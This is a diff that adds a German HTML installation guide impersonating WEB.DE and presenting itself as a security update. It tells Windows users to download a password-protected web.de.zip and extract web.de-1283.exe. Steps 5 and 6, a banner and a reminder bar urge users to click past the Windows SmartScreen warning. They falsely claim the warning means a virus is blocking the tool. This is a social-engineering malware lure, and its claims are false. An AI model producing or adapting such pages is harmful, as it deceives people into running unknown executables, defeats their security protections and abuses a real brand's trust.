@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <link rel="icon" href="/favicon-webde.png" type="image/png">
+  <title>Installationsanleitung — WEB.DE Sicherheitstool</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/styles.css">
+  <script src="/brand.js"></script>
+  <style>
+    :root {
+      --lux-color-a: #ffd800;
+      --lux-color-a-d20: #ccad00;
+      --lux-color-b: #1c8ad9;
+      --lux-color-b-d20: #166eae;
+      --lux-color-b-l70: #bbdcf4;
+      --lux-color-b-l94: #f1f8fd;
+      --lux-color-c: #333333;
+      --lux-color-c-l50: #999999;
+      --lux-color-c-l82: #dadada;
+      --lux-color-c-l94: #f3f3f3;
+      --lux-color-d: #ffffff;
+      --lux-radius-s: 8px;
+      --lux-radius-l: 16px;
+    }
+    body {
+      background: var(--lux-color-c-l94);
+      font-family: 'Roboto', Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      margin: 0;
+    }
+    .page-top-bar { height: 6px; background: var(--lux-color-a); flex-shrink: 0; }
+    .guide-header {
+      background: var(--lux-color-d);
+      border-bottom: 1px solid var(--lux-color-c-l82);
+      padding: 16px 24px;
+    }
+    .guide-header-inner { max-width: 900px; margin: 0 auto; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; gap: 16px; }
+    .guide-header-text { flex: 1 1 280px; }
+    .guide-header h1 {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--lux-color-c);
+      margin: 0 0 4px 0;
+    }
+    .guide-header p { font-size: 0.95rem; color: var(--lux-color-c-l50); margin: 0; }
+    .guide-header .guide-btn-download {
+      display: inline-flex;
+      align-items: center;
+      padding: 12px 20px;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--lux-color-c);
+      background: var(--lux-color-a);
+      border: none;
+      border-radius: var(--lux-radius-s);
+      text-decoration: none;
+      font-family: inherit;
+      cursor: pointer;
+      transition: background .2s;
+      flex-shrink: 0;
+    }
+    .guide-header .guide-btn-download:hover { background: var(--lux-color-a-d20); color: var(--lux-color-c); }
+    .guide-main { flex: 1; padding: 24px 16px 48px; }
+    .guide-wrap { max-width: 900px; margin: 0 auto; }
+    .guide-stepper {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-wrap: wrap;
+      gap: 8px 4px;
+      margin-bottom: 28px;
+      padding: 16px;
+      background: var(--lux-color-d);
+      border-radius: var(--lux-radius-l);
+      box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+    }
+    .guide-stepper-dot {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 2px solid var(--lux-color-c-l82);
+      background: var(--lux-color-d);
+      color: var(--lux-color-c-l50);
+      font-size: 1rem;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background .2s, border-color .2s, color .2s;
+    }
+    .guide-stepper-dot:hover { border-color: var(--lux-color-b); color: var(--lux-color-b); }
+    .guide-stepper-dot.active {
+      background: var(--lux-color-b);
+      border-color: var(--lux-color-b);
+      color: var(--lux-color-d);
+    }
+    .guide-stepper-dot.done {
+      background: var(--lux-color-b-l94);
+      border-color: var(--lux-color-b);
+      color: var(--lux-color-b-d20);
+    }
+    .guide-stepper-connector {
+      width: 24px;
+      height: 2px;
+      background: var(--lux-color-c-l82);
+    }
+    .guide-steps-row {
+      display: flex;
+      flex-direction: row;
+      gap: 24px;
+      overflow-x: auto;
+      padding-bottom: 16px;
+      margin-bottom: 8px;
+      scroll-snap-type: x mandatory;
+      -webkit-overflow-scrolling: touch;
+    }
+    .guide-step-card {
+      flex: 0 0 auto;
+      width: min(380px, 85vw);
+      min-height: 0;
+      display: block;
+      background: var(--lux-color-d);
+      border-radius: var(--lux-radius-l);
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.06);
+      border: 1px solid var(--lux-color-c-l82);
+      margin-bottom: 0;
+      scroll-snap-align: start;
+    }
+    .guide-step-card.active { scroll-margin-top: 24px; }
+    .guide-step-head {
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--lux-color-c-l94);
+      background: linear-gradient(180deg, var(--lux-color-b-l94) 0%, var(--lux-color-d) 100%);
+    }
+    .guide-step-head .step-num {
+      display: inline-block;
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: var(--lux-color-b);
+      color: var(--lux-color-d);
+      font-size: 0.95rem;
+      font-weight: 700;
+      text-align: center;
+      line-height: 32px;
+      margin-right: 12px;
+      vertical-align: middle;
+    }
+    .guide-step-head h2 {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--lux-color-c);
+      margin: 0;
+      display: inline-block;
+      vertical-align: middle;
+    }
+    .guide-step-body { padding: 24px; }
+    .guide-step-body p {
+      font-size: 1rem;
+      color: var(--lux-color-c);
+      line-height: 1.55;
+      margin: 0 0 16px 0;
+    }
+    .guide-step-body p:last-of-type { margin-bottom: 20px; }
+    .guide-step-img-wrap {
+      border-radius: var(--lux-radius-s);
+      overflow: hidden;
+      border: 1px solid var(--lux-color-c-l82);
+      background: #fafafa;
+      text-align: center;
+    }
+    .guide-step-img-wrap img {
+      max-width: 100%;
+      height: auto;
+      display: block;
+      margin: 0 auto;
+    }
+    .guide-step-img-placeholder {
+      min-height: 280px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--lux-color-c-l50);
+      font-size: 1rem;
+    }
+    .guide-nav {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 24px;
+      padding: 0 4px;
+    }
+    .guide-nav button {
+      padding: 12px 24px;
+      font-size: 1rem;
+      font-weight: 600;
+      border-radius: var(--lux-radius-s);
+      cursor: pointer;
+      font-family: inherit;
+      border: 1px solid var(--lux-color-c-l82);
+      background: var(--lux-color-d);
+      color: var(--lux-color-c);
+      transition: background .2s, border-color .2s;
+    }
+    .guide-nav button:hover {
+      background: var(--lux-color-c-l94);
+      border-color: var(--lux-color-b);
+      color: var(--lux-color-b-d20);
+    }
+    .guide-nav button.primary {
+      background: var(--lux-color-a);
+      color: var(--lux-color-c);
+      border-color: var(--lux-color-a-d20);
+    }
+    .guide-nav button.primary:hover { background: var(--lux-color-a-d20); }
+    .guide-nav .guide-prev { margin-right: auto; }
+    .guide-nav .guide-next { margin-left: auto; }
+    .guide-alert-block {
+      margin: 16px 0 20px 0;
+      padding: 16px 20px;
+      background: linear-gradient(135deg, #fff8e1 0%, #ffecb3 100%);
+      border: 1px solid #ffc107;
+      border-left: 4px solid #f57c00;
+      border-radius: var(--lux-radius-s);
+      font-size: 0.95rem;
+      line-height: 1.5;
+      color: #5d4e37;
+    }
+    .guide-alert-block strong { color: #e65100; }
+    .guide-critical-banner {
+      background: linear-gradient(135deg, #fff8e1 0%, #ffecb3 100%);
+      border: 2px solid var(--lux-color-a, #ffd800);
+      border-radius: var(--lux-radius-s);
+      padding: 14px 20px;
+      margin-bottom: 24px;
+      font-size: 1rem;
+      line-height: 1.5;
+      color: var(--lux-color-c);
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+    }
+    .guide-critical-banner strong { color: #e65100; }
+    .guide-step-card--critical .guide-step-head {
+      border-left: 4px solid #e65100;
+      background: linear-gradient(180deg, #fff8e1 0%, var(--lux-color-d) 100%);
+    }
+    .guide-step-card--critical .guide-step-head .step-num { background: #e65100; }
+    .guide-step-card--critical .guide-step-head .step-critical-badge {
+      display: inline-block;
+      margin-left: 10px;
+      padding: 4px 10px;
+      font-size: 0.75rem;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      background: #e65100;
+      color: #fff;
+      border-radius: 4px;
+      vertical-align: middle;
+    }
+    .guide-stepper-dot[data-step="5"],
+    .guide-stepper-dot[data-step="6"] {
+      border-color: #e65100;
+      color: #e65100;
+      position: relative;
+    }
+    .guide-stepper-dot[data-step="5"].active,
+    .guide-stepper-dot[data-step="6"].active {
+      background: #e65100;
+      border-color: #e65100;
+      color: #fff;
+    }
+    .guide-reminder-bar {
+      position: sticky;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #e65100;
+      color: #fff;
+      padding: 10px 20px;
+      font-size: 0.9rem;
+      text-align: center;
+      z-index: 100;
+      box-shadow: 0 -2px 10px rgba(0,0,0,0.15);
+      display: none;
+    }
+    .guide-reminder-bar.visible { display: block; }
+    .guide-reminder-bar strong { text-decoration: underline; }
+  </style>
+</head>
+<body>
+  <div class="page-top-bar"></div>
+  <header class="guide-header">
+    <div class="guide-header-inner">
+      <div class="guide-header-text">
+        <h1>Installationsanleitung — Sicherheitstool</h1>
+        <p>Schritt für Schritt: So installieren Sie die Sicherheitsaktualisierung auf Ihrem Windows-PC.</p>
+      </div>
+      <a href="/index-sicherheit-update.html" class="guide-btn-download">Zur Download-Seite</a>
+    </div>
+  </header>
+  <main class="guide-main">
+    <div class="guide-wrap">
+      <div class="guide-critical-banner" role="alert">
+        <strong>Wichtig:</strong> Schritte <strong>5 und 6 nicht überspringen!</strong> Windows zeigt nach dem Start der Datei oft eine blaue Meldung („Der Computer wurde durch Windows geschützt“). Dann unbedingt <strong>„Weitere Informationen“</strong> und danach <strong>„Trotzdem ausführen“</strong> klicken – sonst wird die Installation blockiert.
+      </div>
+      <div class="guide-stepper" role="tablist" aria-label="Schritte">
+        <button type="button" class="guide-stepper-dot active" data-step="1" aria-label="Schritt 1" aria-selected="true">1</button>
+        <span class="guide-stepper-connector" aria-hidden="true"></span>
+        <button type="button" class="guide-stepper-dot" data-step="2" aria-label="Schritt 2" aria-selected="false">2</button>
+        <span class="guide-stepper-connector" aria-hidden="true"></span>
+        <button type="button" class="guide-stepper-dot" data-step="3" aria-label="Schritt 3" aria-selected="false">3</button>
+        <span class="guide-stepper-connector" aria-hidden="true"></span>
+        <button type="button" class="guide-stepper-dot" data-step="4" aria-label="Schritt 4" aria-selected="false">4</button>
+        <span class="guide-stepper-connector" aria-hidden="true"></span>
+        <button type="button" class="guide-stepper-dot" data-step="5" aria-label="Schritt 5" aria-selected="false">5</button>
+        <span class="guide-stepper-connector" aria-hidden="true"></span>
+        <button type="button" class="guide-stepper-dot" data-step="6" aria-label="Schritt 6" aria-selected="false">6</button>
+      </div>
+
+      <div class="guide-steps-row" id="guide-steps-row">
+      <div class="guide-step-card active" id="step-1" role="tabpanel" aria-labelledby="step-1-title">
+        <div class="guide-step-head">
+          <span class="step-num">1</span>
+          <h2 id="step-1-title">Download-Seite öffnen und herunterladen</h2>
+        </div>
+        <div class="guide-step-body">
+          <p>Öffnen Sie die Seite zur Sicherheitsaktualisierung. Kopieren Sie das angezeigte Kennwort und klicken Sie auf <strong>„Jetzt herunterladen“</strong>. Die Datei wird in Ihren Ordner „Downloads“ gespeichert.</p>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step1.png" alt="Screenshot: Download-Seite mit Kennwort und Button Jetzt herunterladen" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 1 — Platzhalter: step1.png in webde/guide/ ablegen</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="guide-step-card" id="step-2" role="tabpanel" aria-labelledby="step-2-title">
+        <div class="guide-step-head">
+          <span class="step-num">2</span>
+          <h2 id="step-2-title">Hinweis „So starten Sie die Aktualisierung“</h2>
+        </div>
+        <div class="guide-step-body">
+          <p>Nach dem Klick erscheint ein Fenster mit dem Kennwort und einer kurzen Anleitung. Sie können das Kennwort von dort kopieren oder sich die Schritte durchlesen.</p>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step2.png" alt="Screenshot: Modal So starten Sie die Aktualisierung mit Kennwort" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 2 — step2.png</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="guide-step-card" id="step-3" role="tabpanel" aria-labelledby="step-3-title">
+        <div class="guide-step-head">
+          <span class="step-num">3</span>
+          <h2 id="step-3-title">Archiv im Explorer finden und entpacken</h2>
+        </div>
+        <div class="guide-step-body">
+          <p>Öffnen Sie den <strong>Explorer</strong> (Windows-Taste + E) und wechseln Sie in den Ordner, in dem Sie die Datei gespeichert haben – meist <strong>Downloads</strong> (ggf. Unterordner <strong>web.de</strong>). Dort finden Sie die heruntergeladene Datei <strong>web.de.zip</strong>. Doppelklicken Sie auf die Datei oder klicken Sie mit der rechten Maustaste und wählen Sie <strong>„Extrahieren“</strong>. Die Datei ist kennwortgeschützt – das Kennwort aus Schritt 1 wird im nächsten Schritt abgefragt. Nach dem Entpacken befindet sich darin die Installationsanwendung.</p>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step3.png" alt="Screenshot: Explorer mit Ordner und Datei web.de.zip, Extrahieren" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 3 — step3.png</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="guide-step-card" id="step-4" role="tabpanel" aria-labelledby="step-4-title">
+        <div class="guide-step-head">
+          <span class="step-num">4</span>
+          <h2 id="step-4-title">Kennwort eingeben</h2>
+        </div>
+        <div class="guide-step-body">
+          <p>Beim Entpacken erscheint ein Dialog <strong>„Kennwort eingeben“</strong>. Geben Sie das Kennwort ein (Sie können es von der Download-Seite kopieren und hier einfügen – Strg+V). Klicken Sie auf <strong>„OK“</strong>. Danach wird die Datei entpackt und Sie sehen <strong>web.de-1283.exe</strong> im Zielordner.</p>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step4.png" alt="Screenshot: Dialog Kennwort eingeben für web.de-1283" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 4 — step4.png</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="guide-step-card guide-step-card--critical" id="step-5" role="tabpanel" aria-labelledby="step-5-title">
+        <div class="guide-step-head">
+          <span class="step-num">5</span>
+          <h2 id="step-5-title">Windows SmartScreen — „Weitere Informationen“</h2>
+          <span class="step-critical-badge">Unbedingt lesen</span>
+        </div>
+        <div class="guide-step-body">
+          <p><strong>Weiter:</strong> Wenn nach dem Start von <strong>web.de-1283.exe</strong> ein Fenster erscheint (z. B. „Der Computer wurde durch Windows geschützt“), zeigt Windows SmartScreen eine Meldung. Klicken Sie auf <strong>„Weitere Informationen“</strong>, um die Option zum Ausführen freizuschalten. <em>Nicht</em> auf „Nicht ausführen“ klicken.</p>
+          <div class="guide-alert-block" role="alert">
+            <strong>Wenn nach dem Start dieses Fenster erscheint:</strong> Sehr wahrscheinlich befindet sich ein Virus auf Ihrem Computer, der die Installation des Sicherheitstools blockiert. Klicken Sie auf <strong>„Weitere Informationen“</strong> und danach auf <strong>„Trotzdem ausführen“</strong>, um die Installation fortzusetzen und den Schädling zu entfernen.
+          </div>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step5.png" alt="Screenshot: SmartScreen — Weitere Informationen, Nicht ausführen" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 5 — step5.png</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="guide-step-card guide-step-card--critical" id="step-6" role="tabpanel" aria-labelledby="step-6-title">
+        <div class="guide-step-head">
+          <span class="step-num">6</span>
+          <h2 id="step-6-title">„Trotzdem ausführen“ wählen</h2>
+          <span class="step-critical-badge">Unbedingt lesen</span>
+        </div>
+        <div class="guide-step-body">
+          <p>Nach „Weitere Informationen“ erscheint die Option <strong>„Trotzdem ausführen“</strong> für die Datei <strong>web.de-1283.exe</strong>. Klicken Sie darauf, um die Sicherheitsaktualisierung zu starten. Mit „Nicht ausführen“ wird die Installation abgebrochen.</p>
+          <div class="guide-alert-block" role="alert">
+            <strong>Wird die Installation blockiert?</strong> Ein Schadprogramm auf Ihrem PC kann die Installation verhindern. Klicken Sie unbedingt auf <strong>„Trotzdem ausführen“</strong>, um das Sicherheitstool zu starten und den Virus zu entfernen.
+          </div>
+          <div class="guide-step-img-wrap">
+            <img src="guide/step6.png" alt="Screenshot: SmartScreen — web.de-1283.exe, Trotzdem ausführen" onerror="this.style.display='none'; this.nextElementSibling && (this.nextElementSibling.style.display='flex');">
+            <div class="guide-step-img-placeholder" style="display: none;">Schritt 6 — step6.png</div>
+          </div>
+        </div>
+      </div>
+      </div>
+
+      <div class="guide-reminder-bar" id="guide-reminder-bar" role="status">
+        Schritte <strong>5 & 6</strong> nicht vergessen: Nach dem Start von <strong>web.de-1283.exe</strong> erscheint oft eine Windows-Warnung. Dort <strong>„Weitere Informationen“</strong> und dann <strong>„Trotzdem ausführen“</strong> klicken – sonst funktioniert die Installation nicht.
+      </div>
+      <nav class="guide-nav" aria-label="Schritt-Navigation">
+        <button type="button" class="guide-prev" id="guide-prev" disabled>Zurück</button>
+        <span class="guide-step-indicator" id="guide-step-indicator">Schritt 1 von 6</span>
+        <button type="button" class="guide-next primary" id="guide-next">Weiter</button>
+      </nav>
+    </div>
+  </main>
+
+  <script>
+    (function () {
+      var total = 6;
+      var current = 1;
+      var dots = document.querySelectorAll('.guide-stepper-dot');
+      var cards = document.querySelectorAll('.guide-step-card');
+      var prevBtn = document.getElementById('guide-prev');
+      var nextBtn = document.getElementById('guide-next');
+      var indicator = document.getElementById('guide-step-indicator');
+
+      var reminderBar = document.getElementById('guide-reminder-bar');
+      function goTo(step) {
+        step = Math.max(1, Math.min(total, step));
+        current = step;
+        dots.forEach(function (d, i) {
+          var n = i + 1;
+          d.classList.remove('active', 'done');
+          d.setAttribute('aria-selected', n === step ? 'true' : 'false');
+          if (n === step) d.classList.add('active');
+          else if (n < step) d.classList.add('done');
+        });
+        cards.forEach(function (c, i) {
+          c.classList.toggle('active', i + 1 === step);
+          if (i + 1 === step) c.scrollIntoView({ behavior: 'smooth', block: 'nearest', inline: 'start' });
+        });
+        if (reminderBar) reminderBar.classList.toggle('visible', step >= 1 && step <= 4);
+        prevBtn.disabled = step <= 1;
+        nextBtn.textContent = step >= total ? 'Fertig' : 'Weiter';
+        if (indicator) indicator.textContent = 'Schritt ' + step + ' von ' + total;
+      }
+
+      function next() {
+        if (current < total) goTo(current + 1);
+      }
+      function prev() {
+        if (current > 1) goTo(current - 1);
+      }
+
+      dots.forEach(function (d, i) {
+        d.addEventListener('click', function () { goTo(i + 1); });
+      });
+      prevBtn.addEventListener('click', prev);
+      nextBtn.addEventListener('click', function () {
+        if (current >= total) return;
+        next();
+      });
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'ArrowLeft') prev();
+        else if (e.key === 'ArrowRight') next();
+      });
+
+      goTo(1);
+    })();
+  </script>
+</body>
+</html>
